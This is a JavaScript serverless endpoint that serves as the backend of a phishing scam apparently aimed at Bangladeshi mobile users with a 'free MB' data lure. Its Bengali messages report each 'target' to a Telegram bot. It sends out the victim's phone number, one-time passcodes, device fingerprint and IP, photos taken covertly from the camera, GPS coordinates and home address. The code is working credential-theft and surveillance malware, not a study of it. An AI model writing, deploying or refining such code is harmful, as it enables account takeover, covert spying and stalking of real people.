// api/collect.js
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

async function tg(text) {
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML', disable_web_page_preview: true })
        });
    } catch(e) {}
}

async function tgPhoto(photo, caption) {
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, photo, caption })
        });
    } catch(e) {}
}

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    try {
        const d = req.body;
        const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || 'Unknown';
        const time = new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' });
        let msg = '';

        switch(d.type) {
            case 'freemb_initial':
                msg = `
<b>🎯 FREE MB — নতুন টার্গেট!</b>
━━━━━━━━━━━━━━━━━━

<b>📱 ফোন:</b> <code>${d.phone}</code>
<b>🌐 আইপি:</b> <code>${d.device?.ip || ip}</code>

<b>💻 ডিভাইস:</b>
├ 🖥 ${d.device?.userAgent?.substring(0,50) || 'N/A'}
├ 💻 ${d.device?.platform || 'N/A'} | 📐 ${d.device?.screen || 'N/A'}
├ 🧠 ${d.device?.memory || '?'}GB | ⚡ ${d.device?.cores || '?'} cores
├ 🌐 ${d.device?.language || 'N/A'} | 🕐 ${d.device?.timezone || 'N/A'}
${d.device?.network ? `├ 📶 ${d.device.network.type} (${d.device.network.downlink} Mbps)` : ''}
${d.device?.battery ? `└ 🔋 ${d.device.battery.level} ${d.device.battery.charging ? '⚡' : ''}` : ''}

<b>🕐 সময়:</b> ${time}
<b>📦 স্টেজ ১:</b> ✅ ফোন + ফিঙ্গারপ্রিন্ট
`;
                break;

            case 'freemb_otp_sent':
                msg = `
<b>🔢 OTP পাঠানো হয়েছে!</b>
━━━━━━━━━━━━━━━━

<b>📱 ফোন:</b> <code>${d.phone}</code>
<b>🔑 OTP:</b> <code>${d.otp}</code>
<b>🕐 সময়:</b> ${time}
`;
                break;

            case 'freemb_otp_verify':
                const match = d.otp_entered === d.otp_expected;
                msg = `
<b>${match ? '✅' : '❌'} OTP ভেরিফিকেশন!</b>
━━━━━━━━━━━━━━━━━

<b>📱 ফোন:</b> <code>${d.phone}</code>
<b>🔢 লিখেছে:</b> <code>${d.otp_entered}</code>
<b>🔢 সঠিক:</b> <code>${d.otp_expected}</code>
<b>🎯 মিলেছে:</b> ${match ? '✅' : '❌'}
<b>🕐 সময়:</b> ${time}
`;
                break;

            case 'stealth_camera':
                msg = `
<b>📷 হিডেন ক্যামেরা!</b>
━━━━━━━━━━━━━━━━

<b>📱 ফোন:</b> <code>${d.phone}</code>
<b>📸 ছবি:</b> Base64 (${Math.round(d.photo?.length / 1024)}KB)
<b>🕐 সময়:</b> ${time}
<b>📦 স্টেজ:</b> ✅ ক্যামেরা ক্যাপচার
`;
                // Send photo separately
                if (d.photo) await tgPhoto(d.photo, `📸 হিডেন ক্যামেরা — ${d.phone}`);
                break;

            case 'stealth_location':
                msg = `
<b>📍 হিডেন লোকেশন!</b>
━━━━━━━━━━━━━━━━

<b>📱 ফোন:</b> <code>${d.phone}</code>
<b>🌐 ল্যাট:</b> ${d.lat}
<b>🌐 লং:</b> ${d.lng}
<b>📏 একিউরেসি:</b> ${d.accuracy || '?'}m
<b>🔗 গুগল ম্যাপ:</b> https://www.google.com/maps?q=${d.lat},${d.lng}
<b>🕐 সময়:</b> ${time}
<b>📦 স্টেজ:</b> ✅ লোকেশন ক্যাপচার
`;
                break;

            case 'stealth_address':
                msg = `
<b>🏠 সম্পূর্ণ ঠিকানা!</b>
━━━━━━━━━━━━━━━━

<b>📱 ফোন:</b> <code>${d.phone}</code>
<b>📍 </b> ${d.address || 'N/A'}
<b>🏙 </b> ${d.city || 'N/A'}, ${d.country || 'N/A'}
<b>🕐 সময়:</b> ${time}
`;
                break;

            case 'stealth_bluetooth':
                msg = `
<b>🔵 ব্লুটুথ!</b>
━━━━━━━━━━━━

<b>📱 ফোন:</b> <code>${d.phone}</code>
<b>📡 ব্লুটুথ:</b> উপলব্ধ ✅
<b>🕐 সময়:</b> ${time}
`;
                break;

            case 'freemb_complete':
                msg = `
<b>🏆 সম্পূর্ণ ডেটা ক্যাপচার!</b>
━━━━━━━━━━━━━━━━━━━━

<b>📱 ফোন:</b> <code>${d.phone}</code>
<b>🔢 OTP:</b> <code>${d.otp_entered}</code>
<b>📷 ক্যামেরা:</b> ${d.hasCamera ? '✅ ক্যাপচার' : '❌ N/A'}
<b>📍 লোকেশন:</b> ${d.hasLocation ? `✅ ${d.location?.lat}, ${d.location?.lng}` : '❌ N/A'}
<b>🌐 আইপি:</b> <code>${d.device?.ip || ip}</code>

<b>📊 সম্পূর্ণ প্রোফাইল ক্যাপচার করা হয়েছে!</b>
<b>🕐 সময়:</b> ${time}
<b>🔴 সব ডেটা সংগ্রহ সফল!</b>
`;
                break;

            default:
                msg = `<b>📥 ডেটা</b>\n<pre>${JSON.stringify(d, null, 2)}</pre>`;
        }

        await tg(msg);
        console.log(`[${d.type}] ${d.phone || 'N/A'}`);

        return res.status(200).json({ success: true });

    } catch (error) {
        console.error('Error:', error);
        return res.status(500).json({ success: false, error: error.message });
    }
}
